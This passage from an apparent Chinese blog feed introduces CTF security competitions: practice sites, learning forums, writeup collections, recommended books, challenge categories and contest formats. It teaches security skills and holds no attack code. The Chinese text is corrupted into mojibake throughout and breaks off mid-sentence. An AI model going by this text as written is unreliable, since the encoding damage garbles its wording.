id="å›½å¤–ç»¼åˆç»ƒä¹ -è¿›å£çš„-ï¼š"><a href="#å›½å¤–ç»¼åˆç»ƒä¹ -è¿›å£çš„-ï¼š" class="headerlink" title="å›½å¤–ç»¼åˆç»ƒä¹ (è¿›å£çš„)ï¼š"></a>å›½å¤–ç»¼åˆç»ƒä¹ (è¿›å£çš„)ï¼š</h3><p>wechall</p><p><a href="https://link.zhihu.com/?target=http%3A//www.wechall.net/">http://www.wechall.net/</a></p><p>webhacking</p><p><a href="https://link.zhihu.com/?target=http%3A//webhacking.kr/">http://webhacking.kr/</a></p><p>canyouhack</p><p><a href="https://link.zhihu.com/?target=http%3A//canyouhack.it/">http://canyouhack.it/</a></p><p>coolshell</p><p><a href="https://link.zhihu.com/?target=http%3A//fun.coolshell.cn/">http://fun.coolshell.cn/</a></p><p>ringzer0team</p><p><a href="https://link.zhihu.com/?target=https%3A//ringzer0team.com/challenge">https://ringzer0team.com/challenge</a></p><p>backdoor</p><p><a href="https://link.zhihu.com/?target=https%3A//backdoor.sdslabs.co/">https://backdoor.sdslabs.co/</a></p><p>smashthestack</p><p><a href="https://link.zhihu.com/?target=http%3A//smashthestack.org/">http://smashthestack.org/</a></p><p>overthewire</p><p><a href="https://link.zhihu.com/?target=http%3A//overthewire.org/wargames/">http://overthewire.org/wargames/</a></p><p>w3challs</p><p><a href="https://link.zhihu.com/?target=https%3A//w3challs.com/">https://w3challs.com/</a></p><p>chall.stypr</p><p><a href="https://link.zhihu.com/?target=https%3A//chall.stypr.com/home">https://chall.stypr.com/home</a></p><p>pentesterlab</p><p><a href="https://link.zhihu.com/?target=https%3A//pentesterlab.com/">https://pentesterlab.com/</a></p><p>id0-rsa</p><p><a href="https://link.zhihu.com/?target=https%3A//id0-rsa.pub/">https://id0-rsa.pub/</a></p><h2 id="0x03-å„ç§å§¿åŠ¿çš„å­¦ä¹ å¹³å°"><a href="#0x03-å„ç§å§¿åŠ¿çš„å­¦ä¹ å¹³å°" class="headerlink" title="0x03 å„ç§å§¿åŠ¿çš„å­¦ä¹ å¹³å°"></a>0x03 å„ç§å§¿åŠ¿çš„å­¦ä¹ å¹³å°</h2><p>ChaMd5çš„wooyuné•œåƒç«™</p><p><a href="https://link.zhihu.com/?target=http%3A//wooyun.chamd5.org/">http://wooyun.chamd5.org/</a></p><p>å¾çˆ±ç ´è§£</p><p><a href="https://link.zhihu.com/?target=http%3A//www.52pojie.cn/">http://www.52pojie.cn/</a></p><p>çœ‹é›ªè®ºå›</p><p><a href="https://link.zhihu.com/?target=http%3A//bbs.pediy.com/">http://bbs.pediy.com/</a></p><p>T00ls</p><p><a href="https://link.zhihu.com/?target=https%3A//www.t00ls.net/">https://www.t00ls.net/</a></p><h2 id="0x04-CTF-writeup-WP"><a href="#0x04-CTF-writeup-WP" class="headerlink" title="0x04 CTF-writeup(WP)"></a>0x04 CTF-writeup(WP)</h2><p>CTF Writeup Summary</p><p><a href="http://sec.yka.me/">http://sec.yka.me/</a></p><p>360å®‰å…¨å®¢</p><p><a href="http://bobao.360.cn/ctf/">http://bobao.360.cn/ctf/</a></p><p>CTF Writeup github</p><p><a href="https://github.com/ctfs/">https://github.com/ctfs/</a></p><p>Writeupsï¼š<a href="https://github.com/VulnHub/ctf-">https://github.com/VulnHub/ctf-</a></p><h1 id="ä¹¦ç±æ¨è"><a href="#ä¹¦ç±æ¨è" class="headerlink" title="ä¹¦ç±æ¨è"></a>ä¹¦ç±æ¨è</h1><h2 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h2><p>CTFæ¯”èµ›å›½å†…ä¸»è¦åˆ†äº”ç±»ï¼ŒWebæ¸—é€ã€å¯†ç å­¦ã€é€†å‘å·¥ç¨‹ã€æ¼æ´åˆ©ç”¨ã€æ‚é¡¹ã€‚</p><p>CTF æ˜¯æ— æ³•é€šè¿‡ä¸€æœ¬ä¹¦æ¥å®Œæ•´æ¦‚æ‹¬çš„ï¼Œå› æ­¤åˆå­¦è€…åº”è¯¥äº†è§£åŸºç¡€åŸç†ä¹‹ä¸‹å¤šåŠ ç»ƒä¹ ã€‚</p><p>1ã€ä» 0 åˆ° 1 ï¼šCTFer æˆé•¿ä¹‹è·¯</p><p>2ã€CTF ç‰¹è®­è¥ï¼šæŠ€æœ¯è¯¦è§£ã€è§£é¢˜æ–¹æ³•ä¸ç«èµ›æŠ€å·§</p><h2 id="CTF-Web"><a href="#CTF-Web" class="headerlink" title="CTF-Web"></a>CTF-Web</h2><p>1ã€Webå®‰å…¨é˜²æŠ¤æŒ‡å—ï¼šåŸºç¡€ç¯‡</p><p>2ã€ä»£ç å®¡è®¡</p><h2 id="Web-å®‰å…¨"><a href="#Web-å®‰å…¨" class="headerlink" title="Web å®‰å…¨"></a>Web å®‰å…¨</h2><p>1ã€é»‘å®¢æ”»é˜²æŠ€æœ¯å®å…¸-ç³»ç»Ÿå®æˆ˜ç¯‡</p><p>2ã€Web ä¹‹å›°-ç°ä»£ Web åº”ç”¨å®‰å…¨æŒ‡å—</p><p>3ã€é»‘å®¢æ”»é˜²æŠ€æœ¯å®å…¸- Web å®æˆ˜ç¯‡</p><p>4ã€SQL æ³¨å…¥æ”»å‡»ä¸é˜²å¾¡</p><p>5ã€Web æ¸—é€æŠ€æœ¯åŠå®æˆ˜æ¡ˆä¾‹è§£æ</p><p>6ã€Web åº”ç”¨å®‰å…¨æƒå¨æŒ‡å—</p><p>7ã€ç™½å¸½å­è®² Web å®‰å…¨</p><p>8ã€é»‘å®¢å¤§æ›å…‰-ç½‘ç»œå®‰å…¨æœºå¯†ä¸è§£å†³æ–¹æ¡ˆ</p><p>9ã€Wireshark æ•°æ®åŒ…åˆ†æå®æˆ˜</p><p>10ã€Web åº”ç”¨å®‰å…¨å¨èƒä¸é˜²æ²»-åŸºäº OWASP Top 10 ä¸ ESAPI</p><p>11ã€Web å®‰å…¨æ·±åº¦å‰–æ</p><p>12ã€Ajax å®‰å…¨æŠ€æœ¯</p><p>13ã€Web å‰ç«¯é»‘å®¢æŠ€æœ¯æ­ç§˜</p><p>14ã€XSS è·¨ç«™è„šæœ¬æ”»å‡»å‰–æä¸é˜²å¾¡</p><p>15ã€ä»£ç å®¡è®¡-ä¼ä¸šçº§ Web ä»£ç å®‰å…¨æ¶æ„</p><p>16ã€Web å®‰å…¨æµ‹è¯•</p><p>17ã€ç™½å¸½å­è®²æµè§ˆå™¨å®‰å…¨</p><p>18ã€Web å…¥ä¾µå®‰å…¨æµ‹è¯•ä¸å¯¹ç­–</p><h2 id="CTF-Crypto"><a href="#CTF-Crypto" class="headerlink" title="CTF-Crypto"></a>CTF-Crypto</h2><h2 id="CTF-Pwn"><a href="#CTF-Pwn" class="headerlink" title="CTF-Pwn"></a>CTF-Pwn</h2><h2 id="CTF-Reverse"><a href="#CTF-Reverse" class="headerlink" title="CTF-Reverse"></a>CTF-Reverse</h2><p>1ã€é€†å‘å·¥ç¨‹æƒå¨æŒ‡å—</p><h2 id="CTF-Misc"><a href="#CTF-Misc" class="headerlink" title="CTF-Misc"></a>CTF-Misc</h2>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å…³äºCTF</title>
    <link href="/2021/07/30/CTF/%E5%85%B3%E4%BA%8ECTF/"/>
    <url>/2021/07/30/CTF/%E5%85%B3%E4%BA%8ECTF/</url>
    
    <content type="html"><![CDATA[<h1 id="0x01-CTFç®€ä»‹"><a href="#0x01-CTFç®€ä»‹" class="headerlink" title="0x01 CTFç®€ä»‹"></a>0x01 CTFç®€ä»‹</h1><p>CTFï¼ˆ<strong>C</strong>apture <strong>T</strong>he <strong>F</strong>lagï¼Œå¤ºæ——èµ›ï¼‰CTF çš„å‰èº«æ˜¯ä¼ ç»Ÿé»‘å®¢ä¹‹é—´çš„ç½‘ç»œæŠ€æœ¯æ¯”æ‹¼æ¸¸æˆï¼Œèµ·æºäº 1996 å¹´ç¬¬å››å±Š DEFCONï¼Œä»¥ä»£æ›¿ä¹‹å‰é»‘å®¢ä»¬é€šè¿‡äº’ç›¸å‘èµ·çœŸå®æ”»å‡»è¿›è¡ŒæŠ€æœ¯æ¯”æ‹¼çš„æ–¹å¼ã€‚ CTFæ˜¯ä¸€ç§æµè¡Œçš„ä¿¡æ¯å®‰å…¨ç«èµ›å½¢å¼ï¼Œå…¶è‹±æ–‡åå¯ç›´è¯‘ä¸ºâ€œå¤ºå¾—Flagâ€ï¼Œä¹Ÿå¯æ„è¯‘ä¸ºâ€œå¤ºæ——èµ›â€ã€‚å…¶å¤§è‡´æµç¨‹æ˜¯ï¼Œå‚èµ›å›¢é˜Ÿä¹‹é—´é€šè¿‡è¿›è¡Œæ”»é˜²å¯¹æŠ—ã€ç¨‹åºåˆ†æç­‰å½¢å¼ï¼Œç‡å…ˆä»ä¸»åŠæ–¹ç»™å‡ºçš„æ¯”èµ›ç¯å¢ƒä¸­å¾—åˆ°ä¸€ä¸²å…·æœ‰<code>ä¸€å®šæ ¼å¼çš„å­—ç¬¦ä¸²</code>æˆ–å…¶ä»–å†…å®¹ï¼Œå¹¶å°†å…¶æäº¤ç»™ä¸»åŠæ–¹ï¼Œä»è€Œå¤ºå¾—åˆ†æ•°ã€‚ä¸ºäº†æ–¹ä¾¿ç§°å‘¼ï¼Œæˆ‘ä»¬æŠŠè¿™æ ·çš„å†…å®¹ç§°ä¹‹ä¸ºâ€œFlagâ€ã€‚ flagæ‰€è¡¨ç¤ºçš„ä¸ºç›®æ ‡æœåŠ¡å™¨ä¸Šå­˜å‚¨çš„ä¸€äº›<code>æ•æ„Ÿæœºå¯†</code>çš„ä¿¡æ¯, è¿™äº›ä¿¡æ¯æ­£å¸¸æƒ…å†µä¸‹æ˜¯ä¸èƒ½å¯¹å¤–æš´éœ²çš„ã€‚é€‰æ‰‹åˆ©ç”¨ç›®æ ‡çš„ä¸€äº›æ¼æ´ï¼Œè·å–åˆ°flagï¼Œå…¶è¡¨ç¤ºçš„å³ä¸ºåœ¨çœŸå®çš„é»‘å®¢æ”»å‡»ä¸­çªƒå–åˆ°çš„æœºå¯†ä¿¡æ¯ã€‚ ä¸€èˆ¬æƒ…å†µä¸‹flagæ‹¥æœ‰å›ºå®šæ ¼å¼ä¸º<code>flag&#123;xxxxx&#125;</code>ï¼Œæœ‰äº›æ¯”èµ›ä¼šæŠŠflagå…³é”®è¯æ›¿æ¢ï¼Œä¾‹å¦‚CTFHubå¹³å°çš„flagä¸º<code>ctfhub&#123;xxxxx&#125;</code>ï¼Œåˆ©ç”¨å›ºå®šæ ¼å¼æ¥åæ¨flagä¹Ÿæ˜¯ä¸€ç§å¸¸è§çš„è§£é¢˜æ€è·¯ é€šå¸¸æ¥è¯´CTFæ˜¯ä»¥å›¢é˜Ÿä¸ºå•ä½è¿›è¡Œå‚èµ›ã€‚æ¯ä¸ªå›¢é˜Ÿ3-5äºº(å…·ä½“æ ¹æ®ä¸»åŠæ–¹è¦æ±‚å†³å®š)ï¼Œåœ¨æ•´ä¸ªæ¯”èµ›è¿‡ç¨‹ä¸­æ—¢è¦æ¯ä¸ªé€‰æ‰‹æ‹¥æœ‰æŸä¸ªæ–¹å‘çš„æ¼æ´æŒ–æ˜èƒ½åŠ›ï¼Œä¹Ÿè¦åŒé˜Ÿé€‰æ‰‹ä¹‹é—´çš„ç›¸äº’é…åˆã€‚</p><h1 id="0x02-é¢˜ç›®ç±»å‹"><a href="#0x02-é¢˜ç›®ç±»å‹" class="headerlink" title="0x02 é¢˜ç›®ç±»å‹"></a>0x02 é¢˜ç›®ç±»å‹</h1><p>åœ¨CTFä¸­ä¸»è¦åŒ…å«ä»¥ä¸‹5ä¸ªå¤§ç±»çš„é¢˜ç›®ï¼Œæœ‰äº›æ¯”èµ›ä¼šæ ¹æ®è‡ªå·±çš„ä¾§é‡ç‚¹å•ç‹¬æ·»åŠ æŸä¸ªåˆ†ç±»ï¼Œä¾‹å¦‚<code>ç§»åŠ¨è®¾å¤‡(Mobile)</code>, <code>ç”µå­å–è¯(Forensics)</code>ç­‰ï¼Œè¿‘å¹´æ¥ä¹Ÿä¼šå‡ºæ¥æ··åˆç±»å‹çš„é¢˜ç›®ï¼Œä¾‹å¦‚åœ¨Webä¸­å­˜åœ¨ä¸€ä¸ªäºŒè¿›åˆ¶ç¨‹åºï¼Œéœ€è¦é€‰æ‰‹å…ˆåˆ©ç”¨Webçš„æ¼æ´è·å–åˆ°äºŒè¿›åˆ¶ç¨‹åºï¼Œä¹‹åé€šè¿‡é€†å‘æˆ–æ˜¯Pwnç­‰æ–¹å¼è·å¾—æœ€ç»ˆflag</p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><p>Webç±»é¢˜ç›®å¤§éƒ¨åˆ†æƒ…å†µä¸‹å’Œç½‘ã€Webã€HTTPç­‰ç›¸å…³æŠ€èƒ½æœ‰å…³ã€‚ä¸»è¦è€ƒå¯Ÿé€‰æ‰‹å¯¹äºWebæ”»é˜²çš„ä¸€äº›çŸ¥è¯†æŠ€å·§ã€‚è¯¸å¦‚<code>SQLæ³¨å…¥</code>ã€<code>XSS</code>ã€<code>ä»£ç æ‰§è¡Œ</code>ã€<code>ä»£ç å®¡è®¡</code>ç­‰ç­‰éƒ½æ˜¯å¾ˆå¸¸è§çš„è€ƒç‚¹ã€‚ä¸€èˆ¬æƒ…å†µä¸‹Webé¢˜ç›®åªä¼šç»™å‡ºä¸€ä¸ªèƒ½å¤Ÿè®¿é—®çš„URLã€‚éƒ¨åˆ†é¢˜ç›®ä¼šç»™å‡ºé™„ä»¶</p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><p>Pwnç±»é¢˜ç›®é‡ç‚¹è€ƒå¯Ÿé€‰æ‰‹å¯¹äº<code>äºŒè¿›åˆ¶æ¼æ´çš„æŒ–æ˜å’Œåˆ©ç”¨</code>èƒ½åŠ›ï¼Œå…¶è€ƒç‚¹ä¹Ÿé€šå¸¸åœ¨<code>å †æ ˆæº¢å‡º</code>ã€<code>æ ¼å¼åŒ–æ¼æ´</code>ã€<code>UAF</code>ã€<code>Double Free</code>ç­‰å¸¸è§äºŒè¿›åˆ¶æ¼æ´ä¸Šã€‚é€‰æ‰‹éœ€è¦æ ¹æ®é¢˜ç›®ä¸­ç»™å‡ºçš„äºŒè¿›åˆ¶å¯æ‰§è¡Œæ–‡ä»¶è¿›è¡Œé€†å‘åˆ†æï¼Œæ‰¾å‡ºå…¶ä¸­çš„æ¼æ´å¹¶è¿›è¡Œåˆ©ç”¨ï¼Œç¼–å†™å¯¹åº”çš„æ¼æ´æ”»å‡»è„šæœ¬(<code>Exploit</code>)ï¼Œè¿›è€Œå¯¹ä¸»åŠæ–¹ç»™å‡ºçš„è¿œç¨‹æœåŠ¡å™¨è¿›è¡Œæ”»å‡»å¹¶è·å–flagé€šå¸¸æ¥è¯´Pwnç±»é¢˜ç›®ç»™å‡ºçš„è¿œç¨‹æœåŠ¡å™¨ä¿¡æ¯ä¸º<code>nc IP_ADDRESS PORT</code>ï¼Œä¾‹å¦‚<code>nc 1.2.3.4 4567</code>è¿™ç§å½¢å¼ï¼Œè¡¨ç¤ºåœ¨<code>1.2.3.4</code>è¿™ä¸ªIPçš„<code>4567</code>ç«¯å£ä¸Šè¿è¡Œäº†è¯¥é¢˜ç›®</p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><p>Reç±»é¢˜ç›®è€ƒå¯Ÿé€‰æ‰‹<code>é€†å‘å·¥ç¨‹</code>èƒ½åŠ›ã€‚é¢˜ç›®ä¼šç»™å‡ºä¸€ä¸ªå¯æ‰§è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œæœ‰äº›æ—¶å€™ä¹Ÿå¯èƒ½æ˜¯Androidçš„APKå®‰è£…åŒ…ã€‚é€‰æ‰‹éœ€è¦é€†å‘ç»™å‡ºçš„ç¨‹åºï¼Œåˆ†æå…¶ç¨‹åºå·¥ä½œåŸç†ã€‚æœ€ç»ˆæ ¹æ®ç¨‹åºè¡Œä¸ºç­‰è·å¾—flag</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><p>Cryptoç±»é¢˜ç›®è€ƒå¯Ÿé€‰æ‰‹å¯¹<code>å¯†ç å­¦</code>ç›¸å…³çŸ¥è¯†çš„äº†è§£ç¨‹åº¦ï¼Œè¯¸å¦‚<code>RSA</code>ã€<code>AES</code>ã€<code>DES</code>ç­‰éƒ½æ˜¯å¯†ç å­¦é¢˜ç›®çš„å¸¸å®¢ã€‚æœ‰äº›æ—¶å€™ä¹Ÿä¼šç»™å‡ºä¸€ä¸ªåŠ å¯†è„šæœ¬å’Œå¯†æ–‡ï¼Œæ ¹æ®åŠ å¯†æµç¨‹é€†æ¨å‡ºæ˜æ–‡ã€‚</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><p>Miscæ„ä¸ºæ‚é¡¹ï¼Œå³ä¸åŒ…å«åœ¨ä»¥ä¸Šåˆ†ç±»çš„é¢˜ç›®éƒ½ä¼šæ”¾åˆ°è¿™ä¸ªåˆ†ç±»ã€‚é¢˜ç›®ä¼šç»™å‡ºä¸€ä¸ªé™„ä»¶ã€‚é€‰æ‰‹ä¸‹è½½è¯¥é™„ä»¶è¿›è¡Œåˆ†æï¼Œæœ€ç»ˆå¾—å‡ºflag<br> å¸¸è§çš„é¢˜å‹æœ‰å›¾ç‰‡éšå†™ã€è§†é¢‘éšå†™ã€æ–‡æ¡£éšå†™ã€æµé‡åˆ†æã€åè®®åˆ†æã€æ¸¸æˆã€IoT ç›¸å…³ç­‰ç­‰ã€‚äº”èŠ±å…«é—¨ï¼Œç§ç±»ç¹å¤šã€‚</p><h1 id="0x03-ç«èµ›æ¨¡å¼"><a href="#0x03-ç«èµ›æ¨¡å¼" class="headerlink" title="0x03 ç«èµ›æ¨¡å¼"></a>0x03 ç«èµ›æ¨¡å¼</h1><p>CTFç«èµ›æ¨¡å¼å…·ä½“åˆ†ä¸ºä»¥ä¸‹å‡ ç±»ï¼š</p><h2 id="ç†è®ºçŸ¥è¯†"><a href="#ç†è®ºçŸ¥è¯†" class="headerlink" title="ç†è®ºçŸ¥è¯†"></a>ç†è®ºçŸ¥è¯†</h2><p>ç†è®ºé¢˜å¤šè§äºå›½å†…æ¯”èµ›ï¼Œé€šå¸¸ä¸ºé€‰æ‹©é¢˜ã€‚åŒ…å«å•é€‰åŠå¤šé€‰ï¼Œé€‰æ‰‹éœ€è¦æ ¹æ®è‡ªå·±æ‰€å­¦çš„ç›¸å…³ç†è®ºçŸ¥è¯†è¿›è¡Œä½œç­”ã€‚æœ€ç»ˆå¾—å‡ºåˆ†æ•°ã€‚ç†è®ºéƒ¨åˆ†é€šå¸¸å¤šè§äºåˆèµ›æˆ–æ˜¯åˆèµ›ä¹‹å‰çš„æµ·é€‰</p><h2 id="Jeopardy-è§£é¢˜"><a href="#Jeopardy-è§£é¢˜" class="headerlink" title="Jeopardy-è§£é¢˜"></a>Jeopardy-è§£é¢˜</h2><p>å‚èµ›é˜Ÿä¼å¯ä»¥é€šè¿‡äº’è”ç½‘æˆ–è€…ç°åœºç½‘ç»œå‚ä¸ï¼Œå‚æ•°é˜Ÿä¼é€šè¿‡ä¸åœ¨çº¿ç¯å¢ƒäº¤äº’æˆ–æ–‡ä»¶ç¦»çº¿åˆ†æï¼Œè§£å†³ç½‘ç»œå®‰å…¨æŠ€æœ¯æŒ‘æˆ˜è·å–ç›¸åº”åˆ†å€¼ï¼Œç±»ä¼¼äº ACM ç¼–ç¨‹ç«èµ›ã€ä¿¡æ¯å­¦å¥¥æ—åŒ¹å…‹èµ›ï¼Œæ ¹æ®æ€»åˆ†å’Œæ—¶é—´æ¥è¿›è¡Œæ’åã€‚ ä¸åŒçš„æ˜¯è¿™ä¸ªè§£é¢˜æ¨¡å¼ä¸€èˆ¬ä¼šè®¾ç½® ä¸€è¡€(First Blood) ã€ äºŒè¡€(Second Blood) ã€ ä¸‰è¡€(Third Blood) ï¼Œä¹Ÿå³æœ€å…ˆå®Œæˆçš„å‰ä¸‰æ”¯é˜Ÿä¼ä¼šè·å¾—é¢å¤–åˆ†å€¼ï¼Œæ‰€ä»¥è¿™ä¸ä»…æ˜¯å¯¹é¦–å…ˆè§£å‡ºé¢˜ç›®çš„é˜Ÿä¼çš„åˆ†å€¼é¼“åŠ±ï¼Œä¹Ÿæ˜¯ä¸€ç§å›¢é˜Ÿèƒ½åŠ›çš„é—´æ¥ä½“ç°ã€‚ å½“ç„¶è¿˜æœ‰ä¸€ç§æµè¡Œçš„è®¡åˆ†è§„åˆ™æ˜¯è®¾ç½®æ¯é“é¢˜ç›®çš„åˆå§‹åˆ†æ•°åï¼Œæ ¹æ®è¯¥é¢˜çš„æˆåŠŸè§£ç­”é˜Ÿä¼æ•°ï¼Œæ¥é€æ¸é™ä½è¯¥é¢˜çš„åˆ†å€¼ï¼Œä¹Ÿå°±æ˜¯è¯´å¦‚æœè§£ç­”è¿™é“é¢˜çš„äººæ•°è¶Šå¤šï¼Œé‚£ä¹ˆè¿™é“é¢˜çš„åˆ†å€¼å°±è¶Šä½ã€‚æœ€åä¼šä¸‹é™åˆ°ä¸€ä¸ªä¿åº•åˆ†å€¼åä¾¿ä¸å†ä¸‹é™ã€‚ä¸€èˆ¬ç§°ä¹‹ä¸º<code>åŠ¨æ€ç§¯åˆ†</code>é¢˜ç›®ç±»å‹ä¸»è¦åŒ…å« Web ç½‘ç»œæ”»é˜² ã€ RE é€†å‘å·¥ç¨‹ ã€ Pwn äºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨ ã€ Crypto å¯†ç æ”»å‡»ä»¥åŠ Misc å®‰å…¨æ‚é¡¹ è¿™äº”ä¸ªç±»åˆ«ï¼Œä¸ªåˆ«æ¯”èµ›ä¼šæ ¹æ®é¢˜ç›®ç±»å‹è¿›è¡Œæ‰©å±•ã€‚</p><h2 id="AwD-æ”»é˜²æ¨¡å¼"><a href="#AwD-æ”»é˜²æ¨¡å¼" class="headerlink" title="AwD-æ”»é˜²æ¨¡å¼"></a>AwD-æ”»é˜²æ¨¡å¼</h2><p><strong>A</strong>ttack <strong>w</strong>ith <strong>D</strong>efense(AwD)å…¨ç§°æ”»é˜²æ¨¡å¼ï¼Œåœ¨æ”»é˜²æ¨¡å¼CTFèµ›åˆ¶ä¸­ï¼Œå‚èµ›é˜Ÿä¼è¿æ¥åˆ°åŒä¸€ä¸ªç½‘ç»œç©ºé—´ã€‚ä¸»åŠæ–¹ä¼šé¢„å…ˆä¸ºæ¯ä¸ªå‚èµ›é˜Ÿåˆ†é…è¦é˜²å®ˆçš„ä¸»æœºï¼Œè¯¥ä¸»æœºç§°ä¹‹ä¸º<code>GameBox</code>ï¼Œæ¯ä¸ªé˜Ÿä¼ä¹‹é—´çš„GameBox<code>é…ç½®åŠæ¼æ´æ˜¯å®Œå…¨ä¸€è‡´</code>çš„ï¼Œé€‰æ‰‹éœ€è¦é˜²æŠ¤è‡ªå·±çš„GameBoxä¸è¢«æ”»å‡»çš„åŒæ—¶æŒ–æ˜æ¼æ´å¹¶æ”»å‡»å¯¹æ‰‹æœåŠ¡æ¥å¾—åˆ†ã€‚åœ¨AwDä¸­ä¸»åŠæ–¹ä¼šè¿è¡Œä¸€ä¸ªåä¸º<code>Checker</code>çš„ç¨‹åºå®šæ—¶æ£€æµ‹é€‰æ‰‹çš„GameBoxçš„è¿è¡ŒçŠ¶æ€ã€‚è‹¥æ£€æµ‹åˆ°çŠ¶æ€ä¸å¯¹åˆ™åˆ¤å®šè¯¥GameBoxå®•æœºï¼ŒæŒ‰ç…§è§„åˆ™æ‰£é™¤ä¸€å®šåˆ†æ•°ã€‚æ”»é˜²æ¨¡å¼CTFèµ›åˆ¶å¯ä»¥å®æ—¶é€šè¿‡å¾—åˆ†åæ˜ å‡ºæ¯”èµ›æƒ…å†µï¼Œæœ€ç»ˆä¹Ÿä»¥å¾—åˆ†ç›´æ¥åˆ†å‡ºèƒœè´Ÿï¼Œæ˜¯ä¸€ç§ç«äº‰æ¿€çƒˆï¼Œå…·æœ‰å¾ˆå¼ºè§‚èµæ€§å’Œé«˜åº¦é€æ˜æ€§çš„ç½‘ç»œå®‰å…¨èµ›åˆ¶ã€‚åœ¨è¿™ç§èµ›åˆ¶ä¸­ï¼Œä¸ä»…ä»…æ˜¯æ¯”å‚èµ›é˜Ÿå‘˜çš„æ™ºåŠ›å’ŒæŠ€æœ¯ï¼Œä¹Ÿæ¯”ä½“åŠ›ï¼ˆå› ä¸ºæ¯”èµ›ä¸€èˆ¬éƒ½ä¼šæŒç»­24è‡³48å°æ—¶å·¦å³ï¼‰ï¼ŒåŒæ—¶ä¹Ÿæ¯”å›¢é˜Ÿä¹‹é—´çš„åˆ†å·¥é…åˆä¸åˆä½œã€‚ AwDé€šå¸¸ä»…åŒ…å«<code>Web</code>åŠ<code>Pwn</code>ä¸¤ç§ç±»å‹çš„é¢˜ç›®ã€‚æ¯ä¸ªé˜Ÿä¼å¯èƒ½ä¼šåˆ†åˆ°å¤šä¸ªGameBoxï¼Œéšç€æ¯”èµ›çš„è¿›è¡Œï¼Œæœ€æ—©çš„GameBoxå¯èƒ½ä¼šä¸‹çº¿ï¼ŒåŒæ—¶ä¼šä¸Šçº¿æ–°çš„GameBoxã€‚</p><h2 id="RHG-è‡ªåŠ¨åŒ–-AIè‡ªåŠ¨åŒ–"><a href="#RHG-è‡ªåŠ¨åŒ–-AIè‡ªåŠ¨åŒ–" class="headerlink" title="RHG-è‡ªåŠ¨åŒ–[ AIè‡ªåŠ¨åŒ–]"></a>RHG-è‡ªåŠ¨åŒ–[ AIè‡ªåŠ¨åŒ–]</h2><p><strong>R</strong>obo <strong>H</strong>acking <strong>G</strong>ame(RHG)è¯¥åˆ©ç”¨äººå·¥æ™ºèƒ½æˆ–æ˜¯AIæˆ–æ˜¯è‡ªåŠ¨åŒ–æ”»å‡»ç¨‹åºæ¥å…¨è‡ªåŠ¨çš„æŒ–æ˜å¹¶åˆ©ç”¨æ¼æ´ï¼Œè€ƒéªŒé€‰æ‰‹å¯¹äº<code>æ¼æ´ç†è§£</code>ä»¥åŠ<code>å·¥ç¨‹åŒ–</code>èƒ½åŠ›ã€‚æ¯”èµ›å¼€å§‹å‰(ä¸€èˆ¬ä¸º1-4å‘¨å·¦å³)ä¸»åŠæ–¹ä¼šç»™å‡ºæµ‹è¯•ç¯å¢ƒä»¥åŠç›¸å…³æ¥å£æ–‡æ¡£ã€‚é€‰æ‰‹éœ€è¦ç¼–å†™è‡ªåŠ¨åŒ–ç¨‹åºæ¥è¯·æ±‚æ¥å£è·å–é¢˜ç›®ç›¸å…³ä¿¡æ¯ï¼Œè¯¥ç±»ç¨‹åºé€šå¸¸ç§°ä¹‹ä¸º<code>bot</code>ï¼Œåœ¨ç¨‹åºä¸­<code>å…¨è‡ªåŠ¨</code>è®¿é—®å¹¶æŒ–æ˜ç›®æ ‡æ¼æ´ï¼Œå®Œæˆåˆ©ç”¨æ¼æ´æ”»å‡»å¹¶è·å–flagçš„è¿‡ç¨‹ã€‚è·å–åˆ°çš„flagä¹Ÿç”±ç¨‹åºè‡ªåŠ¨åŒ–æäº¤ã€‚RHGå› ä¸ºæ˜¯ç”±botå…¨è‡ªåŠ¨è¿›è¡Œå·¥ä½œï¼Œæ‰€ä»¥æ¯”èµ›å¼€å§‹å³å¯è§†ä¸ºç»“æŸã€‚å‰©ä¸‹çš„ä¸€åˆ‡å…¨çœ‹å‚èµ›é€‰æ‰‹ç¼–å†™çš„è‡ªåŠ¨åŒ–botçš„å·¥ä½œæƒ…å†µã€‚ æ¯”èµ›è¿‡ç¨‹ä¸­ä¸å…è®¸é€‰æ‰‹å¯¹botè¿›è¡Œä»»ä½•çš„æ“ä½œ(åŒ…æ‹¬debug/patchç­‰ç­‰)ã€‚é€‰æ‰‹ä»…èƒ½çœ‹åˆ°è‡ªå·±çš„botå®Œæˆäº†å“ªäº›é¢˜ã€‚ç›®å‰çš„å¾—åˆ†æƒ…å†µç­‰ç­‰ã€‚</p><h2 id="RW-çœŸå®ä¸–ç•Œ"><a href="#RW-çœŸå®ä¸–ç•Œ" class="headerlink" title="RW-çœŸå®ä¸–ç•Œ"></a>RW-çœŸå®ä¸–ç•Œ</h2><p><strong>R</strong>eal <strong>W</strong>orld(RW) é¦–æ¬¡äº2018å¹´<code>é•¿äº­ç§‘æŠ€</code>ä¸»åŠçš„RealWorldCTFä¸­å‡ºç°ï¼Œè¯¥èµ›åˆ¶ç€é‡è€ƒå¯Ÿé€‰æ‰‹åœ¨é¢å¯¹çœŸå®çš„ç¯å¢ƒä¸‹çš„æ¼æ´æŒ–æ˜ä¸åˆ©ç”¨èƒ½åŠ›ã€‚é€šå¸¸RWæ¨¡å¼å‡ºé¢˜ä¹Ÿä¼šå›´ç»•ç€èƒ½å¤Ÿåº”ç”¨äºçœŸå®æ¸—é€æ”»å‡»å½“ä¸­çš„æ¼æ´ï¼Œä¸€èˆ¬æ¥è¯´RWå¸¸è§é¢˜å‹ä¸ºVM/Dockeré€ƒé€¸ã€é’ˆå¯¹æµè§ˆå™¨çš„æ”»å‡»ã€é’ˆå¯¹IoT/Carç­‰è®¾å¤‡çš„æ”»å‡»ï¼ŒWebç±»æ”»å‡»ç­‰ç­‰ åœ¨RWèµ›åˆ¶ä¸­ä¼šæœ‰ä¸€ä¸ª<code>Show 